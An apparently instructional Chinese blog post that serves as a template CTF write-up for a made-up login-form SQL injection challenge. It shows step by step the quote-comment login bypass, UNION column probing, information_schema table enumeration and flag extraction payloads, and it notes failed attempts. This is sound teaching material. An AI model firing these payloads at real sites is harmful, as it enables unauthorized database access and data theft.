---
layout: post
title: "示例 WP：一道 SQL 注入题的完整写法"
date: 2026-09-23 21:10:00 +0800
categories: Web
tags: [SQL注入, Web, WP模板]
description: "用一道假设的登录框注入题，演示 WP 该写到什么颗粒度（flag 为示例，不是真题）。"
---

> 这是一篇**模板演示**，题目是构造出来的，flag 也是假的最新示例。真实 WP 请换成你靶场里那道题的截图、payload 和实际回显。

## 一、题目信息

| 项 | 内容 |
|---|---|
| 方向 | Web |
| 题目 | 登录框（示例） |
| 地址 | `http://target.example/login` |
| 附件 | 无 |
| 提示 | 无 |

## 二、环境

- Windows 11 + Burp Suite Community
- 浏览器：Chrome，关闭缓存
- 字典：`/usr/share/seclists/...`（或直接手注，这题不需要字典）

## 三、信息收集

先看登录框的行为：

```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=123456
```

返回统一的「用户名或密码错误」，没有明显的时序差异。试 `admin'` 时返回 500，说明参数被拼进了 SQL，而且没有报错处理——典型的**盲注/报错注入**候选。

再试 `admin' -- `，页面跳到「欢迎」，说明注释符生效、且 `username` 是注入点。

## 四、过程

### 4.1 先确认闭合方式

```text
username=admin' -- 
password=任意
```

成功登录 → 单引号闭合，后面注释掉密码校验。

### 4.2 判断列数与回显位

```text
username=' UNION SELECT 1,2,3 -- 
```

页面回显了 `2` 的位置，说明有三列、第二列可回显。

### 4.3 拿库名

```text
username=' UNION SELECT 1,database(),3 -- 
```

回显 `ctf`。

### 4.4 拿表名

```text
username=' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema='ctf' -- 
```

回显 `users,flag`。

### 4.5 拿 flag

```text
username=' UNION SELECT 1,group_concat(flag),3 FROM flag -- 
```

拿到 `flag{ex4mple_...}`。

## 五、关键 payload

```sql
' UNION SELECT 1,group_concat(flag),3 FROM flag -- 
```

## 六、失败过的尝试

- 一开始试 `' OR 1=1 -- `：能登录，但只进了普通用户页，看不到 flag——**这题的目标不是绕过登录，是读库**
- 试过 `' AND extractvalue(1,concat(0x7e,database())) -- `：报错被统一页面吞了，报错注入走不通，才转 UNION

## 七、总结

- 考点：**UNION 联合查询注入 + information_schema 信息收集**
- 排查顺序：先判断注入点 → 再判断闭合/注释 → 再判断列数与回显 → 最后按库→表→字段取数据
- 以后遇到「登录失败但输入单引号报 500」的框，直接往注入方向想，别死磕爆破

> 写 WP 时把「失败过的尝试」写进去很有价值：它说明你不是抄的，也知道边界在哪。
